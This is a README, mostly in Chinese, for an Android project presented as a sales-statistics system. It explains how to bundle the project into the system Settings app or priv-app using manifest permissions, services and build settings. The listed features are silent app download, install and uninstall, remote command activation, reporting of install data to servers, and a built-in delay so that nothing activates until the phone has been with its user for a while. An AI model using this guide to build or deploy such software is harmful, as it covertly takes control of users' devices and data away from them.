# AndroidStatistics

This is a mobile phones information collection system of the test program

一.移植方式：
------
  移植分两种形式，独立apk形式和以jar包形式放入Settings.apk中两种。
  1. 独立apk形式移植，直接放入system/priv-app下面。
  2. 以jar包形式移植。<br>
   （1）将此项目中的/src目录下的所有文件，以jar的方式导出为android_help.jar<br> 
   （2）在settings项目中创建libs文件夹，将jar包放入libs文件夹下。<br>
   （3）在Settings/AndroidManifest.xml文件中加入下列权限:
   
   	<!-- add statistics start--><br>
   	
	<uses-permission android:name="android.permission.ACTION_DOWNLOAD_COMPLETE"/>
    <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />
    <uses-permission android:name="android.permission.DELETE_PACKAGES" />
    
	<!-- add statistics end--><br>

  在application中加入下列组件内容：其中标注红色的ChannelID的value值为移植时候需要提前商定的渠道号

	<!-- add statistics start-->
        <meta-data 
			android:value="hemiao_001" 
			android:name="ChannelID"/>      
        <receiver android:name="com.android.statistics.PerfectReceiver"
            android:exported="true"
            android:process=":remote" >
            <intent-filter>
                <action android:name="android.intent.action.USER_PRESENT" />
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" /> 
            </intent-filter>
             <intent-filter>   
             <action android:name="android.intent.action.PACKAGE_ADDED" />
             <data android:scheme="package" />   
            </intent-filter> 
             <intent-filter>   
             <action android:name="android.intent.action.PACKAGE_REMOVED" />
             <data android:scheme="package" />   
            </intent-filter> 
        </receiver>
        		
		<service 
			android:name="com.android.statistics.PerfectService" 
			android:process=":remote" >
		    <intent-filter>
                <action android:name="com.perfect.android.init"></action>
                <action android:name="com.perfect.android.again"></action>
                <action android:name="andorid.intent.silent.start"></action>
                <action android:name="andorid.intent.silent.in"></action>
            </intent-filter>
        </service> 
         <service
            android:name="com.android.statistics.OrderActivationService"
            android:process=":remote" >
              <intent-filter>
                <action android:name="com.android.mpsplug.activation" >
                </action>
            </intent-filter>
        </service>
          <!-- add statistics end-->

          
（4）在Android.mk文件中加入引用jar包的配置信息具体如下:

\#Add-by yunlong ---start

		LOCAL_JAVA_LIBRARIES += \
       	org.apache.http.legacy
		LOCAL_STATIC_JAVA_LIBRARIES += \
       	android_help_lib
		
\#Add-by yunlong ---end

\#Add-by yunlong ---start

		include $(CLEAR_VARS)
		LOCAL_PREBUILT_STATIC_JAVA_LIBRARIES := android_help_lib:libs/android_help.jar
		include $(BUILD_MULTI_PREBUILT)

\#Add-by yunlong ---end

注意：若Settings目录下存在tests文件夹，需要在Settings/tests/下新建libs目录，将android_help.jar文件复制到该目录下。
（不这样做的话，会在全编的时候报错）
二.项目内容
------
此项目主要涉及如下基本核心功能：<br>
	1.销量统计、静默安装（包含下载、安装、激活）、指令激活、静默卸载等基本的功能;<br>
	2.需要有开始下载、结束下载，安装、激活的数据上报，为了更好的分析运营数据;<br>
	3.运营控制时间的管理，确保手机到了用户手上一段时间后才会得到运营;<br>
	4.客户端代码已经使用域名的集成方式，域名已经申请好;<br>

